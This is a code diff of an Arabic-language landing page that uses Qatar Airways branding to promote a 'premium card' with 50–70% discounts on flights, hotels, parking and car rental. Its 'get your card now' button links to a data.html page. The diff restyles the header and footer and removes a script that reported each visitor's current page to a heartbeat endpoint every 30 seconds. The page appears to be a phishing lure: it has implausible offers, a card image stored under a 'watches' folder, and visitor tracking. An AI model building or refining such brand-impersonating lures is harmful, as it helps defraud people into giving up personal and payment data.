@@ -22,22 +22,41 @@
             color: var(--text-dark);
         }
         
-        /* Header Styling */
+        /* Unified Header - White with Menu Icon */
         header {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
-            background-color: #000000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            background-color: #ffffff;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 12px 24px;
             z-index: 1000;
         }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 24px;
+            height: 18px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 2px;
+            background-color: #000;
+            border-radius: 2px;
+        }
         .header-left img {
-            height: 40px;
+            height: 38px;
             object-fit: contain;
             display: block;
         }
@@ -52,7 +71,7 @@
         }
         
         .main-container {
-            margin-top: 69px;
+            margin-top: 62px;
             width: 100%;
         }
         .banner-video {
@@ -63,14 +82,12 @@
             display: block;
         }
         
-        /* Main Content Section */
         .content-section {
             padding: 30px 20px;
             max-width: 800px;
             margin: 0 auto;
         }
 
-        /* Card Showcase Section */
         .card-showcase {
             text-align: center;
             margin-bottom: 40px;
@@ -108,7 +125,6 @@
             line-height: 1.6;
         }
 
-        /* Benefits List inside Card */
         .card-benefits-list {
             text-align: right;
             max-width: 500px;
@@ -129,10 +145,6 @@
             font-weight: 500;
         }
 
-        .benefit-item:last-child {
-            margin-bottom: 0;
-        }
-
         .benefit-item i {
             color: var(--qatar-maroon);
             font-size: 16px;
@@ -151,7 +163,6 @@
             transition: all 0.3s ease;
         }
 
-        /* Compact Features List */
         .compact-features-list {
             background: #ffffff;
             border-radius: 20px;
@@ -203,7 +214,6 @@
             margin-top: 2px;
         }
 
-        /* Discount Circle Styling */
         .discount-circle {
             margin-right: auto;
             width: 50px;
@@ -219,7 +229,6 @@
             box-shadow: 0 4px 10px rgba(92, 6, 50, 0.2);
         }
 
-        /* Promo Banner */
         .promo-banner {
             background: var(--qatar-maroon);
             border-radius: 20px;
@@ -294,7 +303,6 @@
             margin-top: 10px;
         }
 
-        /* Footer Styling */
         footer {
             background-color: #000000;
             color: #ffffff;
@@ -307,13 +315,22 @@
             text-align: center;
         }
         .footer-logo {
-            height: 30px;
+            height: 35px;
             margin-bottom: 20px;
+            filter: brightness(0) invert(1);
         }
         .footer-info {
             font-size: 13px;
             line-height: 1.8;
             color: #ccc;
+        }
+        .footer-bottom {
+            margin-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #bbb;
         }
         
         @media (max-width: 768px) {
@@ -337,6 +354,11 @@
 
     <header>
         <div class="header-left">
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
             <img src="images/qatar_airways/logo.png" alt="الخطوط الجوية القطرية">
         </div>
         <div class="header-right">
@@ -350,7 +372,6 @@
         </video>
         
         <div class="content-section">
-            <!-- Card Showcase Section -->
             <div class="card-showcase">
                 <div class="card-promo-large">
                     <img src="images/watches/card1.png" alt="بطاقة الخطوط الجوية القطرية المميزة">
@@ -358,7 +379,6 @@
                 <h2 class="card-showcase-title">بطاقة مميزة من الخطوط الجوية القطرية</h2>
                 <p class="card-showcase-subtitle">احصل على بطاقتك الآن خلال دقائق واستمتع بعالم من الرفاهية والمزايا التي لا تنتهي</p>
                 
-                <!-- Benefits List -->
                 <div class="card-benefits-list">
                     <div class="benefit-item"><i class="fas fa-check-circle"></i> يمكنك الحجز والسفر في نفس اليوم</div>
                     <div class="benefit-item"><i class="fas fa-check-circle"></i> إنترنت مجاني فائق السرعة على متن الطائرة</div>
@@ -370,9 +390,7 @@
                 <a href="data.html" class="order-btn-top">احصل على بطاقتك الآن</a>
             </div>
 
-            <!-- Compact Features List -->
             <div class="compact-features-list">
-                <!-- Parking -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-parking"></i></div>
                     <div class="compact-content">
@@ -382,7 +400,6 @@
                     <div class="discount-circle">50%</div>
                 </div>
                 
-                <!-- Flight Tickets -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-plane"></i></div>
                     <div class="compact-content">
@@ -392,7 +409,6 @@
                     <div class="discount-circle">70%</div>
                 </div>
                 
-                <!-- Hotel Bookings -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-hotel"></i></div>
                     <div class="compact-content">
@@ -402,7 +418,6 @@
                     <div class="discount-circle">60%</div>
                 </div>
                 
-                <!-- Car Rental -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-car"></i></div>
                     <div class="compact-content">
@@ -413,7 +428,6 @@
                 </div>
             </div>
             
-            <!-- Promo Banner -->
             <div class="promo-banner">
                 <div class="promo-left">
                     <div class="promo-title">لطلب بطاقتك الآن</div>
@@ -455,21 +469,10 @@
                 © 2026 الخطوط الجوية القطرية. جميع الحقوق محفوظة.<br>
                 نحن ملتزمون بتوفير أفضل الخدمات والمزايا الحصرية لأعضاء نادي الامتياز.
             </div>
+            <div class="footer-bottom">
+                سياسة الخصوصية | الشروط والأحكام | اتصل بنا
+            </div>
         </div>
     </footer>
-
-    <script>
-        async function sendHeartbeat() {
-            try {
-                await fetch('/api/heartbeat', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ currentPage: window.location.pathname })
-                });
-            } catch (e) {}
-        }
-        setInterval(sendHeartbeat, 30000);
-        sendHeartbeat();
-    </script>
 </body>
 </html>
